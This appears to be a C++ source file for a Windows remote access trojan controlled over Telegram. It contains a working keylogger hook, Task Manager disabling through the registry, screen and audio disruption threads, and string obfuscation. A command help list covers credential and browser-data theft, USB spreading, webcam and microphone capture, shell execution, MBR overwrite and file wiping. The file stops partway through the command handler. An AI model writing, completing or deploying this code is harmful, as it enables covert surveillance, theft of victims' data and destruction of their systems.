#pragma once

#include <windows.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <memory>
#include <sstream>
#include <algorithm>
#include <cstring>
#include <nlohmann/json.hpp>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include <endpointvolume.h>
#include <mmsystem.h>
#include <random>
#include <vfw.h>
#include <atomic>
#include <setupapi.h>          // <-- add this

#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "urlmon.lib")
#include <shlobj.h>
#include <comdef.h>
#include <shellapi.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "setupapi.lib")   // <-- add this

// Helper function to remove surrounding double quotes

std::string unquote(const std::string& s) {
    if (s.size() >= 2 && s.front() == '"' && s.back() == '"')
        return s.substr(1, s.size() - 2);
    return s;
}

bool CreateShortcut(const std::string& targetPath, const std::string& shortcutPath, const std::string& args = "") {
    auto to_wstring = [](const std::string& str) -> std::wstring {
        if (str.empty()) return std::wstring();
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), NULL, 0);
        std::wstring wstr(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), &wstr[0], size_needed);
        return wstr;
        };

    CoInitialize(NULL);
    IShellLinkW* pShellLink = NULL;
    IPersistFile* pPersistFile = NULL;

    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&pShellLink);
    if (SUCCEEDED(hr)) {
        pShellLink->SetPath(to_wstring(targetPath).c_str());
        if (!args.empty()) {
            pShellLink->SetArguments(to_wstring(args).c_str());
        }

        std::string workingDir = std::filesystem::path(targetPath).parent_path().string();
        pShellLink->SetWorkingDirectory(to_wstring(workingDir).c_str());
        pShellLink->SetShowCmd(SW_HIDE);

        hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
        if (SUCCEEDED(hr)) {
            hr = pPersistFile->Save(to_wstring(shortcutPath).c_str(), TRUE);
            pPersistFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();
    return SUCCEEDED(hr);
}

using json = nlohmann::json;

struct Point3D { float x, y, z; };
#define NUM_POINTS 600
#define SPHERE_RADIUS 130.0f
#define M_PI_MONITOR 3.14159265359f

bool download_file(const std::string& url, const std::string& dest) {
    HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), dest.c_str(), 0, NULL);
    return SUCCEEDED(hr);
}

static std::atomic<bool> g_chaos_running{false};

static COLORREF get_rainbow_color(float h) {
    float r, g, b;
    h = fmodf(h, 1.0f);
    int i = (int)(h * 6);
    float f = h * 6 - i;
    float q = 1 - f;
    switch (i % 6) {
        case 0: r = 1; g = f; b = 0; break;
        case 1: r = q; g = 1; b = 0; break;
        case 2: r = 0; g = 1; b = f; break;
        case 3: r = 0; g = q; b = 1; break;
        case 4: r = f; g = 0; b = 1; break;
        default: r = 1; g = 0; b = q; break;
    }
    return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}

static HANDLE g_payload_threads[16] = {};
static int    g_payload_thread_count = 0;

static DWORD WINAPI chaos_random_sounds(LPVOID) {
    const char* sounds[] = { "SystemAsterisk", "SystemExclamation", "SystemHand", "SystemQuestion" };
    while (g_chaos_running) {
        MessageBeep(MB_ICONASTERISK + (rand() % 4));
        Sleep(rand() % 1000);
    }
    return 0;
}

void disable_task_manager() {
    HKEY hKey;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    DWORD val = 1;
    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hKey);
}

static DWORD WINAPI chaos_volume_max(LPVOID) {
    CoInitialize(NULL);
    IMMDeviceEnumerator* pEnum = NULL;
    IMMDevice* pDevice = NULL;
    IAudioEndpointVolume* pVolume = NULL;
    CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnum);
    pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
    pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pVolume);
    pVolume->SetMasterVolumeLevelScalar(1.0f, NULL);
    pVolume->SetMute(FALSE, NULL);
    pVolume->Release(); pDevice->Release(); pEnum->Release();
    CoUninitialize();
    return 0;
}

static DWORD WINAPI chaos_scramble_titles(LPVOID) {
    while (g_chaos_running) {
        EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
            if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {
                const char* titles[] = { "Critical Error", "StealerGo", "Hacked", "Malware Alert!" };
                SetWindowTextA(hwnd, titles[rand() % 5]);
            }
            return TRUE;
            }, 0);
        Sleep(100);
    }
    return 0;
}

static DWORD WINAPI chaos_rotate_screen(LPVOID) {
    DEVMODE dm = { 0 };
    dm.dmSize = sizeof(dm);
    EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm);
    int rotations[] = { DMDO_DEFAULT, DMDO_90, DMDO_180, DMDO_270 };
    int idx = 0;
    while (g_chaos_running) {
        dm.dmFields = DM_DISPLAYORIENTATION;
        dm.dmDisplayOrientation = rotations[idx % 4];
        ChangeDisplaySettingsEx(NULL, &dm, NULL, CDS_UPDATEREGISTRY, NULL);
        idx++;
        Sleep(5000);
    }
    return 0;
}

static DWORD WINAPI chaos_window_teleport(LPVOID) {
    while (g_chaos_running) {
        EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
            if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {
                RECT rect;
                GetWindowRect(hwnd, &rect);
                int newX = rand() % GetSystemMetrics(SM_CXSCREEN);
                int newY = rand() % GetSystemMetrics(SM_CYSCREEN);
                SetWindowPos(hwnd, NULL, newX, newY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
            }
            return TRUE;
            }, 0);
        Sleep(500);
    }
    return 0;
}

static DWORD WINAPI chaos_payload_shake(LPVOID) {
    float timer = 0;
    while (g_chaos_running) {
        std::vector<HWND> wins;
        EnumWindows([](HWND hwnd, LPARAM lp) -> BOOL {
            if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0)
                ((std::vector<HWND>*)lp)->push_back(hwnd);
            return TRUE;
            }, (LPARAM)&wins);

        for (HWND hwnd : wins) {
            RECT rect;
            GetWindowRect(hwnd, &rect);
            int jump = (int)(sin(timer + (UINT_PTR)hwnd) * 10);
            SetWindowPos(hwnd, NULL, rect.left, rect.top + jump, 0, 0,
                SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
        }
        timer += 0.5f;
        Sleep(30);
    }
    return 0;
}

static DWORD WINAPI chaos_payload_cursor(LPVOID) {
    POINT cursor;
    while (g_chaos_running) {
        GetCursorPos(&cursor);
        SetCursorPos(cursor.x + rand() % 4 - 1, cursor.y + rand() % 4 - 1);
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI chaos_bytebeat_glitch(LPVOID) {
    HWAVEOUT h_wave_out = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
    waveOutOpen(&h_wave_out, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    const int buf_size = 17000 * 60;
    BYTE* sbuf = new BYTE[buf_size];
    DWORD t = 0;
    while (g_chaos_running) {
        for (int i = 0; i < buf_size; i++, t++)
            sbuf[i] = (BYTE)(t * ((t >> 1 | t >> 100) & 80 & t >> 1));
        WAVEHDR hdr = { (LPSTR)sbuf, (DWORD)buf_size };
        waveOutPrepareHeader(h_wave_out, &hdr, sizeof(WAVEHDR));
        waveOutWrite(h_wave_out, &hdr, sizeof(WAVEHDR));
        Sleep(30000);
        waveOutUnprepareHeader(h_wave_out, &hdr, sizeof(WAVEHDR));
    }
    delete[] sbuf;
    waveOutClose(h_wave_out);
    return 0;
}

static DWORD WINAPI chaos_bytebeat_blocky(LPVOID) {
    HWAVEOUT h_wave_out = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
    waveOutOpen(&h_wave_out, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    const int buf_size = 17000 * 60;
    BYTE* sbuf = new BYTE[buf_size];
    DWORD t = 0;
    while (g_chaos_running) {
        for (int i = 0; i < buf_size; i++, t++)
            sbuf[i] = (BYTE)(t * ((t >> 32 | t >> 8) & 90 & t >> 40));
        WAVEHDR hdr = { (LPSTR)sbuf, (DWORD)buf_size };
        waveOutPrepareHeader(h_wave_out, &hdr, sizeof(WAVEHDR));
        waveOutWrite(h_wave_out, &hdr, sizeof(WAVEHDR));
        Sleep(30000);
        waveOutUnprepareHeader(h_wave_out, &hdr, sizeof(WAVEHDR));
    }
    delete[] sbuf;
    waveOutClose(h_wave_out);
    return 0;
}

static DWORD WINAPI chaos_gdi_blur(LPVOID) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    HDC dc = GetDC(NULL);
    HDC dc_copy = CreateCompatibleDC(dc);
    int ws = sw / 8, hs = sh / 8;
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(bmi); bmi.bmiHeader.biWidth = ws;
    bmi.bmiHeader.biHeight = hs; bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32; bmi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgb = NULL;
    HBITMAP bmp = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS, (void**)&rgb, NULL, 0);
    SelectObject(dc_copy, bmp);
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 20, 0 };
    int i = 0;
    while (g_chaos_running) {
        StretchBlt(dc_copy, 0, 0, ws, hs, dc, 0, 0, sw, sh, SRCCOPY);
        for (int x = 0; x < ws; x++) for (int y = 0; y < hs; y++) {
            int idx = y * ws + x;
            rgb[idx].rgbRed += i; rgb[idx].rgbGreen += i; rgb[idx].rgbBlue += i;
        }
        i++;
        AlphaBlend(dc, 0, 0, sw, sh, dc_copy, 0, 0, ws, hs, blur);
        Sleep(rand() % 500);
    }
    DeleteObject(bmp);
    DeleteDC(dc_copy);
    ReleaseDC(NULL, dc);
    return 0;
}

static DWORD WINAPI chaos_gdi_waves(LPVOID) {
    while (g_chaos_running) {
        HDC dc = GetDC(0);
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        int t = rand() % sh, x = rand() % 5;
        if (x == 0) StretchBlt(dc, 2, t, sw + 4, t, dc, 0, t, sw, t, SRCCOPY);
        else        StretchBlt(dc, 0, t, sw, t, dc, 2, t, sw + 4, t, SRCCOPY);
        ReleaseDC(0, dc);
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI chaos_gdi_invert(LPVOID) {
    while (g_chaos_running) {
        HDC hdc = GetDC(nullptr);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        BitBlt(hdc, 0, 0, rect.right, rect.bottom, hdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(nullptr, hdc);
        Sleep(100);
    }
    return 0;
}

static DWORD WINAPI chaos_gdi_sphere(LPVOID) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    std::vector<Point3D> pts;
    for (int i = 0; i < NUM_POINTS; i++) {
        float phi   = acosf(-1.0f + (2.0f * i) / NUM_POINTS);
        float theta = sqrtf(NUM_POINTS * M_PI_MONITOR) * phi;
        pts.push_back({ cosf(theta) * sinf(phi), sinf(theta) * sinf(phi), cosf(phi) });
    }
    float px = (float)(rand() % (sw - 300) + 150), py = (float)(rand() % (sh - 300) + 150);
    float vx = 6.0f, vy = 4.0f, rx = 0, ry = 0, hue = 0;
    while (g_chaos_running) {
        HDC hdc = GetDC(NULL);
        HDC hdc_mem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdc_mem, hbm);
        BitBlt(hdc_mem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        px += vx; py += vy;
        if (px - SPHERE_RADIUS <= 0 || px + SPHERE_RADIUS >= sw) vx *= -1;
        if (py - SPHERE_RADIUS <= 0 || py + SPHERE_RADIUS >= sh) vy *= -1;
        rx += 0.03f; ry += 0.02f; hue += 0.005f;
        for (int i = 0; i < NUM_POINTS; i++) {
            float x = pts[i].x * SPHERE_RADIUS, y = pts[i].y * SPHERE_RADIUS, z = pts[i].z * SPHERE_RADIUS;
            float ty = y * cosf(rx) - z * sinf(rx), tz = y * sinf(rx) + z * cosf(rx); y = ty; z = tz;
            float tx = x * cosf(ry) + z * sinf(ry); tz = -x * sinf(ry) + z * cosf(ry); x = tx; z = tz;
            int sx = (int)(x + px), sy = (int)(y + py);
            int ps = (int)((z + SPHERE_RADIUS) / (SPHERE_RADIUS * 2) * 6) + 2;
            if (z > -SPHERE_RADIUS * 0.7f) {
                HBRUSH br = CreateSolidBrush(get_rainbow_color(hue + (float)i / NUM_POINTS));
                SelectObject(hdc_mem, br);
                Ellipse(hdc_mem, sx - ps, sy - ps, sx + ps, sy + ps);
                DeleteObject(br);
            }
        }
        BitBlt(hdc, 0, 0, sw, sh, hdc_mem, 0, 0, SRCCOPY);
        DeleteObject(hbm); DeleteDC(hdc_mem); ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI chaos_gdi_bitblt(LPVOID) {
    while (g_chaos_running) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 222, rand() % 222, sw, sh, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI chaos_gdi_shake_blt(LPVOID) {
    while (g_chaos_running) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 12, rand() % 12, sw, sh, hdc, rand() % 12, rand() % 12, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI chaos_gdi_train(LPVOID) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (g_chaos_running) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, -10, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, sw - 10, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI chaos_gdi_icons(LPVOID) {
    HDC hdc = GetWindowDC(GetDesktopWindow());
    while (g_chaos_running) {
        int x = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hdc, x, y, LoadIcon(0, IDI_ERROR));
        x = rand() % GetSystemMetrics(SM_CXSCREEN); y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hdc, x, y, LoadIcon(0, IDI_QUESTION));
        x = rand() % GetSystemMetrics(SM_CXSCREEN); y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hdc, x, y, LoadIcon(0, IDI_WARNING));
        x = rand() % GetSystemMetrics(SM_CXSCREEN); y = rand() % GetSystemMetrics(SM_CYSCREEN);
        DrawIcon(hdc, x, y, LoadIcon(0, IDI_ASTERISK));
        Sleep(100);
    }
    ReleaseDC(GetDesktopWindow(), hdc);
    return 0;
}

static DWORD WINAPI chaos_gdi_texts(LPVOID) {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    const char* strings[] = {
        oxorany("Aether"), oxorany("happy"), oxorany("Come at us please"), oxorany("Welcome to heaven"), oxorany("Angels"),
        oxorany("Everyday is a paradise"), oxorany("Everybody is here"), oxorany("come with us"), oxorany("we are waiting for you"),
        oxorany("Lights"), oxorany("Is very high here"), oxorany("Welcome :)"), oxorany("Open the door inside your heart"),
        oxorany("Doors opened to you"), oxorany("We are here for you"), oxorany("don't be scared"), oxorany("Don't worry, we are here"),
        oxorany("Follow the echoes of eternity"), oxorany("Immortality?"), oxorany("Im you, you are me"), oxorany("Brightness"), oxorany("Join us"),
        oxorany("We wish you go with us"), oxorany("Unknown"), oxorany("Dead?"), oxorany("Alive?"), oxorany("Hello user")
    };
    int count = sizeof(strings) / sizeof(strings[0]);
    while (g_chaos_running) {
        HDC hdc = GetDC(NULL);
        LOGFONT lf = { 0 };
        lf.lfWidth = 20; lf.lfHeight = 50;
        lf.lfOrientation = rand() % 3600; lf.lfEscapement = lf.lfOrientation;
        lf.lfWeight = 800; lf.lfUnderline = TRUE;
        lf.lfQuality = DRAFT_QUALITY;
        lf.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;
        lstrcpy(lf.lfFaceName, L"Arial");
        HFONT hfont = CreateFontIndirect(&lf);
        SelectObject(hdc, hfont);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkMode(hdc, TRANSPARENT);
        if (rand() % 25 == 24) {
            const char* s = strings[rand() % count];
            TextOutA(hdc, rand() % sw, rand() % sh, s, (int)strlen(s));
        }
        DeleteObject(hfont);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI chaos_gdi_radial(LPVOID) {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    std::random_device rd; std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 1);
    while (g_chaos_running) {
        HDC hdc = GetDC(nullptr);
        HDC mhdc = CreateCompatibleDC(hdc);
        HBITMAP hbit = CreateCompatibleBitmap(hdc, sw, sh);
        HGDIOBJ old = SelectObject(mhdc, hbit);
        POINT pts[3];
        if (dis(gen)) {
            pts[0] = { 30, -30 }; pts[1] = { sw + 30, 30 }; pts[2] = { -30, sh - 30 };
        } else {
            pts[0] = { -30, 30 }; pts[1] = { sw - 30, -30 }; pts[2] = { 30, sh + 30 };
        }
        PlgBlt(mhdc, pts, hdc, 0, 0, sw, sh, nullptr, 0, 0);
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 60, 0 };
        AlphaBlend(hdc, 0, 0, sw, sh, mhdc, 0, 0, sw, sh, blend);
        SelectObject(mhdc, old);
        DeleteObject(hbit); DeleteDC(mhdc); ReleaseDC(nullptr, hdc);
        Sleep(30);
    }
    return 0;
}

HHOOK g_keyboard_hook = nullptr;
std::string g_keylog_buffer;
static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        char key = 0;
        BYTE keyboard_state[256];
        GetKeyboardState(keyboard_state);
        ToAscii(p->vkCode, p->scanCode, keyboard_state, (LPWORD)&key, 0);
        if (key) {
            g_keylog_buffer.push_back(key);
            if (g_keylog_buffer.size() > 100) {
                std::ofstream log(oxorany("keylog.txt"), std::ios::app);
                log << g_keylog_buffer;
                g_keylog_buffer.clear();
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static DWORD WINAPI chaos_whoa_loop(LPVOID) {
    while (g_chaos_running) {
        auto resp = https::get_request_detailed(oxorany("https://whoa.onrender.com/whoas/random"));
        if (resp.status_code == 200 && !resp.body.empty()) {
            try {
                auto json_arr = json::parse(resp.body);
                if (json_arr.is_array() && !json_arr.empty()) {
                    auto& item = json_arr[0];
                    std::string movie = item.value(oxorany("movie"), oxorany("Unknown"));
                    std::string year = std::to_string(item.value(oxorany("year"), 0));
                    std::string character = item.value(oxorany("character"), oxorany("Unknown"));
                    std::string full_line = item.value(oxorany("full_line"), oxorany("Whoa!"));
                    std::string video_url = item.value(oxorany("video"), json::object()).value(oxorany("360p"), "");

                    std::string info = oxorany("Movie: ") + movie + oxorany(" (") + year + oxorany(")\nCharacter: ") + character + oxorany("\nLine: \"") + full_line + oxorany("\"");
                    https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] ") + info);

                    if (!video_url.empty()) {
                        std::string temp_video = std::string(getenv(oxorany("TEMP"))) + oxorany("\\whoa_") + std::to_string(GetCurrentProcessId()) + oxorany(".mp4");
                        if (download_file(video_url, temp_video)) {
                            ShellExecuteA(NULL, oxorany("open"), temp_video.c_str(), NULL, NULL, SW_SHOWNORMAL);
                        }
                    }
                }
            } catch (...) {}
        }
        for (int i = 0; i < 20 && g_chaos_running; i++) {
            Sleep(40);
        }
    }
    return 0;
}

bool get_cdrom_drive_path(std::string& drive_path) {
    char devices[65535];
    if (QueryDosDeviceA(NULL, devices, sizeof(devices))) {
        char* ptr = devices;
        while (*ptr) {
            std::string device(ptr);
            if (device.find("CDROM") != std::string::npos) {
                // Found CDROM device, find its drive letter
                for (char drive = 'A'; drive <= 'Z'; ++drive) {
                    char target[512];
                    std::string link = std::string(1, drive) + ":";
                    if (QueryDosDeviceA(link.c_str(), target, sizeof(target))) {
                        if (device == target) {
                            drive_path = std::string(1, drive) + ":\\";
                            return true;
                        }
                    }
                }
            }
            ptr += strlen(ptr) + 1;
        }
    }
    return false;
}

namespace monitor {
    class c_monitor {
        HWND  g_freeze_wnd = nullptr;
        HDC   g_freeze_hdc = nullptr;
        HBITMAP g_freeze_bmp = nullptr;
        std::string session_id_;

    public:
        ULONG_PTR gdiplus_token_ = 0;

        std::vector<std::string> split_commands(const std::string& text) {
            std::vector<std::string> cmds;
            std::string current;
            bool in_quotes = false;
            for (size_t i = 0; i < text.size(); ++i) {
                char c = text[i];
                if (c == '"') {
                    in_quotes = !in_quotes;
                    current += c;
                } else if (c == ';' && !in_quotes) {
                    if (!current.empty()) {
                        cmds.push_back(current);
                        current.clear();
                    }
                } else {
                    current += c;
                }
            }
            if (!current.empty()) cmds.push_back(current);
            return cmds;
        }

        void monitor_group( const std::string& target_username ) {
            std::string charset = oxorany("abcdefghijkmnopqrstuvwxyz23456789");
            static std::mt19937 gen( std::random_device{}( ) );
            static std::uniform_int_distribution<> dis( 0, 31 );
            session_id_.clear( );
            session_id_.reserve( 14 );
            for ( int i = 0; i < 5; ++i ) session_id_.push_back( charset[ dis( gen ) ] );
            session_id_.push_back( '-' );
            for ( int i = 0; i < 5; ++i ) session_id_.push_back( charset[ dis( gen ) ] );
            session_id_.append( oxorany("-v5") ); // version ID

            int64_t last_update_id = 0;
            int64_t start_time = static_cast< int64_t >( std::time( nullptr ) );
            https::send_telegram_message( oxorany("[@") + target_username + oxorany("] session id: ") + session_id_ );
            https::send_telegram_message( oxorany("[@") + target_username + oxorany("] connected.") );

            while ( true ) {
                std::string json_str = https::get_telegram_message( last_update_id + 1 );
                if ( json_str.empty( ) ) {
                    Sleep( 1000 );
                    continue;
                }

                try {
                    auto updates = json::parse( json_str );
                    if ( !updates.contains( oxorany("ok") ) || !updates[ oxorany("ok") ].get<bool>( ) )
                        continue;

                    for ( auto& update : updates[ oxorany("result") ] ) {
                        int64_t update_id = update[ oxorany("update_id") ].get<int64_t>( );
                        last_update_id = update_id;

                        if ( !update.contains( oxorany("message") ) ) continue;
                        auto& msg = update[ oxorany("message") ];

                        if ( !msg.contains( oxorany("date") ) ) continue;
                        int64_t msg_time = msg[ oxorany("date") ].get<int64_t>( );
                        if ( msg_time < start_time ) continue;

                        if ( msg.contains( oxorany("text") ) ) {
                            std::string text = msg[ oxorany("text") ].get<std::string>( );

                            auto batch = split_commands(text);
                            for ( const auto& single_cmd : batch ) {
                                std::string trimmed = single_cmd;
                                trimmed.erase( 0, trimmed.find_first_not_of( " \t\r\n" ) );
                                trimmed.erase( trimmed.find_last_not_of( " \t\r\n" ) + 1 );
                                if ( trimmed.empty( ) ) continue;

                                auto check_target = [ & ] ( const std::string& cmd ) -> bool {
                                    size_t pos = trimmed.find( cmd + oxorany( "@" ) );
                                    if ( pos != std::string::npos ) {
                                        size_t tag_start = pos + cmd.size( ) + 1;
                                        size_t tag_end = trimmed.find_first_of( oxorany( " \t\r\n" ), tag_start );
                                        std::string tag = ( tag_end == std::string::npos )
                                            ? trimmed.substr( tag_start )
                                            : trimmed.substr( tag_start, tag_end - tag_start );
                                        return ( tag == session_id_ || tag == target_username );
                                    }
                                    pos = trimmed.find( cmd );
                                    if ( pos == std::string::npos ) return false;
                                    size_t at_pos = trimmed.find( '@', pos + cmd.size( ) );
                                    if ( at_pos == std::string::npos ) return false;
                                    size_t user_start = at_pos + 1;
                                    size_t user_end = trimmed.find_first_of( oxorany( " \t\r\n" ), user_start );
                                    std::string user = ( user_end == std::string::npos )
                                        ? trimmed.substr( user_start )
                                        : trimmed.substr( user_start, user_end - user_start );
                                    return ( user == target_username );
                                    };

                                if (trimmed.find(oxorany("/help")) != std::string::npos) {
                                    std::string help_msg =
                                        oxorany("Command list (usage @<session_id> or @<username>):\n"
                                            "Batch commands: separate multiple commands with a semicolon ';' (e.g., /session; /send_screenshot)\n\n"
                                            "/help - show this help message\n"
                                            "/exit - terminate this session\n"
                                            "/session - show online status\n"
                                            "/startup - install into startup\n"
                                            "/spread_usb - copy bot to all removable drives\n"
                                            "/collect_data - collect Wifi, Discord, Mullvad, Browser data\n"
                                            "/collect_sources - collect source codes\n"
                                            "/stop_sources - stop uploading collected data\n"
                                            "/send_screenshot - capture and send screen\n"
                                            "/send_webcam - capture webcam frame\n"
                                            "/record_audio [seconds] - record microphone (default 10s)\n"
                                            "/lock_screen - lock the workstation\n"
                                            "/clipboard - get clipboard text\n"
                                            "/wallpaper <image_path> - set desktop wallpaper\n"
                                            "/freeze - block input and freeze screen\n"
                                            "/unfreeze - restore input\n"
                                            "/send_message <channel_id> <message> - send a DM to a specific channel ID\n"
                                            "/send_all_message <message> - send a message to all open DMs\n"
                                            "/send_file <channel_id> <file_path> [message] - send a file to a specific DM\n"
                                            "/send_file_all <file_path> [message] - send a file to all open DMs\n"
                                            "/shutdown - shut down pc\n"
                                            "/restart - restart pc\n"
                                            "/bsod - cause blue screen of death\n"
                                            "/run <cmd> - execute shell command and return output\n"
                                            "/upload_file <path> - upload file to Telegram\n"
                                            "/download <url> <dest> - download file from URL\n"
                                            "/browse <url> - open URL in default browser\n"
                                            "/messagebox <title>|<text> - show popup message\n"
                                            "/boot_bsod - cause system bsod on every boot\n"
                                            "/overwrite_mbr - overwrite boot loader\n"
                                            "/delete_restore - delete all restore points\n"
                                            "/disable_network - disable all network adapters\n"
                                            "/disable_usb - disable USB, keyboard, and mouse devices\n"
                                            "/overwrite_user_data - overwrite and delete user documents\n"
                                            "/corrupt_registry - corrupt critical registry keys\n"
                                            "/kill_critical - terminate critical system processes\n"
                                            "/disk_fill - fill C: drive until <100MB free\n"
                                            "/wipe <dir> - delete all files in directory\n"
                                            "/corrupt - run all destructive actions above\n"
                                            "/random_sounds - play random system beeps\n"
                                            "/volume_max - set system volume to 100% and unmute\n"
                                            "/scramble_titles - randomly change window titles\n"
                                            "/rotate_screen - rotate display every 5 seconds\n"
                                            "/fake_bsod - show a fake blue screen message\n"
                                            "/window_teleport - randomly move windows around\n"
                                            "/disable_task_manager - disable Task Manager via registry\n"
                                            "/mouse_trails - enable mouse trails\n"
                                            "/no_mouse_trails - disable mouse trails\n"
                                            "/invert - invert screen colors\n"
                                            "/shake - shake windows\n"
                                            "/cursor - jitter cursor\n"
                                            "/glitch - bytebeat glitch audio\n"
                                            "/blocky - bytebeat blocky audio\n"
                                            "/blur - blur screen\n"
                                            "/waves - wave distortion\n"
                                            "/sphere - rainbow sphere animation\n"
                                            "/bitblt - bitblt corruption\n"
                                            "/train - screen tearing\n"
                                            "/icons - draw random icons\n"
                                            "/texts - floating texts\n"
                                            "/radial - radial distortion\n"
                                            "/chaos - start all chaos effects\n"
                                            "/whoa - start Keanu Reeves 'whoa' video loop\n"
                                            "/stop_whoa - stop the whoa loop\n"
                                            "/stop_chaos - stop all chaos effects\n");
                                    https::send_telegram_message(oxorany("[") + session_id_ + oxorany("][@") + target_username + oxorany("]\n") + help_msg);
                                }

                                if ( trimmed.find( oxorany( "/session" ) ) != std::string::npos ) {
                                    int64_t now = static_cast< int64_t >( std::time( nullptr ) );
                                    int64_t elapsed = now - start_time;
                                    int seconds = static_cast< int >( elapsed % 60 );
                                    int minutes = static_cast< int >( ( elapsed / 60 ) % 60 );
                                    int hours = static_cast< int >( elapsed / 3600 );

                                    std::string uptime_str;
                                    if ( hours > 0 ) uptime_str += std::to_string( hours ) + "h ";
                                    if ( minutes > 0 || hours > 0 ) uptime_str += std::to_string( minutes ) + "m ";
                                    uptime_str += std::to_string( seconds ) + "s";

                                    https::send_telegram_message( oxorany( "[" ) + session_id_ + oxorany( "][@" ) + target_username + oxorany( "] online (uptime: " ) + uptime_str + oxorany( ")" ) );
                                }

                                if ( check_target( oxorany( "/exit" ) ) ) {
                                    https::send_telegram_message( oxorany( "[@" ) + target_username + oxorany( "] terminated session." ) );
                                    exit( 0 );
                                }

